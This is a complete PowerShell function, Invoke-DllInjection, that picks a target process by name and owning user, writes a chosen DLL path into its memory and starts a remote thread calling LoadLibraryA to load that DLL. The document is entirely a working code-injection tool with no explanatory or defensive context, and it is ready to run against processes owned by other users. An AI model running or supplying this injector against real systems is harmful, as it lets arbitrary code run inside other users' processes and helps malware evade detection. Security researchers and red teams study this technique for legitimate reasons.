function Invoke-DllInjection {
    param (
        [Parameter(Mandatory = $true)]
        [string]$ProcessName,  # Name of the target process

        [Parameter(Mandatory = $true)]
        [string]$UserName,  # Username of the user running the target process

        [Parameter(Mandatory = $true)]
        [string]$Dll  # Path to the DLL to inject
    )

    # Get the list of processes by name and user
    try {
        $processes = Get-Process -Name $ProcessName -ErrorAction Stop
        $targetProcess = $processes | Where-Object { (Get-WmiObject Win32_Process -Filter "ProcessId = $($_.Id)").GetOwner().User -eq $UserName }
        if (-not $targetProcess) {
            Write-Error "No process with the name '$ProcessName' found for the user '$UserName'."
            return
        }
    } catch {
        Write-Error "Process '$ProcessName' does not exist!"
        return
    }

    # Confirm that the path to the DLL exists
    try {
        $Dll = (Resolve-Path $Dll -ErrorAction Stop).Path
        Write-Verbose "Full path to DLL: $Dll"
    } catch {
        Write-Error "Invalid DLL path!"
        return
    }

    # Load necessary DLLs for invoking Windows API functions
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class NativeMethods {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibraryA(string lpFileName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

    # Define constants
    $PROCESS_ALL_ACCESS = 0x1F0FFF
    $MEM_COMMIT = 0x1000
    $MEM_RESERVE = 0x2000
    $PAGE_READWRITE = 0x04

    # Open the target process
    $hProcess = [NativeMethods]::OpenProcess($PROCESS_ALL_ACCESS, $false, $targetProcess.Id)
    if ($hProcess -eq [IntPtr]::Zero) {
        Write-Error "Unable to open process with ID $($targetProcess.Id)."
        return
    }

    # Allocate memory for the DLL path in the target process
    $DllBytes = [System.Text.Encoding]::ASCII.GetBytes($Dll + [char]0) # Add null terminator
    $DllLength = $DllBytes.Length
    $lpBaseAddress = [NativeMethods]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $DllLength, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_READWRITE)
    if ($lpBaseAddress -eq [IntPtr]::Zero) {
        Write-Error "Unable to allocate memory in the target process."
        return
    }

    # Write the DLL path to the allocated memory in the target process
    $bytesWritten = 0
    $result = [NativeMethods]::WriteProcessMemory($hProcess, $lpBaseAddress, $DllBytes, $DllLength, [ref]$bytesWritten)
    if (-not $result) {
        Write-Error "Unable to write memory in the target process."
        return
    }

    # Load kernel32.dll and get the address of LoadLibraryA
    $kernel32 = [NativeMethods]::LoadLibraryA("kernel32.dll")
    if ($kernel32 -eq [IntPtr]::Zero) {
        Write-Error "Unable to load kernel32.dll."
        return
    }

    $LoadLibraryAddr = [NativeMethods]::GetProcAddress($kernel32, "LoadLibraryA")
    if ($LoadLibraryAddr -eq [IntPtr]::Zero) {
        Write-Error "Unable to find LoadLibraryA address."
        return
    }

    # Create a remote thread in the target process to call LoadLibraryA
    $hThread = [NativeMethods]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $LoadLibraryAddr, $lpBaseAddress, 0, [IntPtr]::Zero)
    if ($hThread -eq [IntPtr]::Zero) {
        Write-Error "Unable to create remote thread in the target process."
        return
    }

    # Wait for the thread to finish
    [System.Threading.Thread]::Sleep(1000)  # Wait for 1 second

    # Clean up: Close the handles
    [NativeMethods]::CloseHandle($hThread)
    [NativeMethods]::CloseHandle($hProcess)

    Write-Host "DLL injected successfully into process $($targetProcess.Id) with name '$ProcessName'."
}
